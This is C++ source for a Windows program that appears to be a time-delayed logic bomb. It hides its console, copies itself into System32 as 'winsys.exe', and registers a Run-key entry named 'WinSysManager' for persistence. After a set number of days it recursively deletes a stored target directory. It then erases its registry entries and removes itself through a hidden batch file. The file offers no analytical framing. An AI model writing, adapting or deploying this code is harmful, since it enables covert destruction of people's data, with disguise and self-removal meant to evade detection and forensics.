#include <windows.h>
#include <shlobj.h>
#include <string>
#include <fstream>

std::string getSelfPath() {
    char path[MAX_PATH];
    GetModuleFileNameA(NULL, path, MAX_PATH);
    return std::string(path);
}

std::string getStartupPath() {
    char path[MAX_PATH];
    GetWindowsDirectoryA(path, MAX_PATH);
    std::string fullPath = std::string(path) + "\\System32\\winsys.exe";
    return fullPath;
}

void addToRegistry(const std::string& path) {
    HKEY key;
    RegOpenKeyExA(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &key);
    RegSetValueExA(key, "WinSysManager", 0, REG_SZ, (BYTE*)path.c_str(), path.length() + 1);
    RegCloseKey(key);
}

void saveDelayData(int days, const std::string& path) {
    HKEY key;
    RegCreateKeyExA(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows\\System", 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &key, NULL);
    RegSetValueExA(key, "SysConfig", 0, REG_DWORD, (BYTE*)&days, sizeof(days));
    RegSetValueExA(key, "SysPath", 0, REG_SZ, (BYTE*)path.c_str(), path.length() + 1);
    
    FILETIME ft;
    SYSTEMTIME st;
    GetSystemTime(&st);
    SystemTimeToFileTime(&st, &ft);
    RegSetValueExA(key, "SysTime", 0, REG_BINARY, (BYTE*)&ft, sizeof(ft));
    RegCloseKey(key);
}

bool checkDelayExpired() {
    HKEY key;
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows\\System", 0, KEY_READ, &key) != ERROR_SUCCESS) 
        return false;
    
    DWORD days = 0;
    FILETIME ftStart;
    DWORD size = sizeof(days);
    
    RegQueryValueExA(key, "SysConfig", 0, NULL, (BYTE*)&days, &size);
    size = sizeof(ftStart);
    RegQueryValueExA(key, "SysTime", 0, NULL, (BYTE*)&ftStart, &size);
    
    SYSTEMTIME stNow;
    FILETIME ftNow;
    GetSystemTime(&stNow);
    SystemTimeToFileTime(&stNow, &ftNow);
    
    ULARGE_INTEGER start, now;
    start.LowPart = ftStart.dwLowDateTime;
    start.HighPart = ftStart.dwHighDateTime;
    now.LowPart = ftNow.dwLowDateTime;
    now.HighPart = ftNow.dwHighDateTime;
    
    ULONGLONG diffDays = (now.QuadPart - start.QuadPart) / 10000000ULL / 86400ULL;
    RegCloseKey(key);
    return diffDays >= days;
}

std::string getTargetFromRegistry() {
    HKEY key;
    char buf[MAX_PATH];
    DWORD size = sizeof(buf);
    
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows\\System", 0, KEY_READ, &key) != ERROR_SUCCESS) 
        return "";
    
    if (RegQueryValueExA(key, "SysPath", 0, NULL, (BYTE*)buf, &size) != ERROR_SUCCESS) {
        RegCloseKey(key);
        return "";
    }
    RegCloseKey(key);
    return std::string(buf);
}

void deleteFileOrDirectory(const std::string& path) {
    DWORD attrs = GetFileAttributesA(path.c_str());
    if (attrs & FILE_ATTRIBUTE_DIRECTORY) {
        WIN32_FIND_DATAA ffd;
        HANDLE hFind = FindFirstFileA((path + "\\*").c_str(), &ffd);
        if (hFind != INVALID_HANDLE_VALUE) {
            do {
                if (strcmp(ffd.cFileName, ".") != 0 && strcmp(ffd.cFileName, "..") != 0) {
                    std::string fullPath = path + "\\" + ffd.cFileName;
                    deleteFileOrDirectory(fullPath);
                }
            } while (FindNextFileA(hFind, &ffd) != 0);
            FindClose(hFind);
        }
        RemoveDirectoryA(path.c_str());
    } else {
        DeleteFileA(path.c_str());
    }
}

void removeSelf(const std::string& selfPath) {
    char tempPath[MAX_PATH];
    GetTempPathA(MAX_PATH, tempPath);
    std::string batPath = std::string(tempPath) + "\\clean.bat";
    
    std::ofstream bat(batPath);
    bat << "@echo off\n";
    bat << ":loop\n";
    bat << "del \"" << selfPath << "\" >nul 2>&1\n";
    bat << "if exist \"" << selfPath << "\" goto loop\n";
    bat << "del \"%~f0\"\n";
    bat.close();
    
    STARTUPINFOA si = {sizeof(si)};
    PROCESS_INFORMATION pi;
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    CreateProcessA(NULL, (LPSTR)batPath.c_str(), NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
}

void clearRegistry() {
    RegDeleteKeyExA(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows\\System", KEY_ALL_ACCESS, 0);
    HKEY key;
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_ALL_ACCESS, &key) == ERROR_SUCCESS) {
        RegDeleteValueA(key, "WinSysManager");
        RegCloseKey(key);
    }
}

int main(int argc, char* argv[]) {
    ShowWindow(GetConsoleWindow(), SW_HIDE);
    
    std::string self = getSelfPath();
    std::string dir = self.substr(0, self.find_last_of("\\/"));

    if (argc >= 2 && std::string(argv[1]) == "delay" && argc >= 3) {
        int days = std::stoi(argv[2]);
        std::string np = getStartupPath();
        CopyFileA(self.c_str(), np.c_str(), FALSE);
        addToRegistry(np);
        saveDelayData(days, dir);
        return 0;
    }

    if (argc >= 2 && std::string(argv[1]) == "reboot") {
        std::string np = getStartupPath();
        CopyFileA(self.c_str(), np.c_str(), FALSE);
        addToRegistry(np);
        saveDelayData(0, dir);
        return 0;
    }

    if (checkDelayExpired()) {
        std::string target = getTargetFromRegistry();
        if (!target.empty()) {
            deleteFileOrDirectory(target);
            clearRegistry();
            removeSelf(self);
        }
    }

    return 0;
}























































































































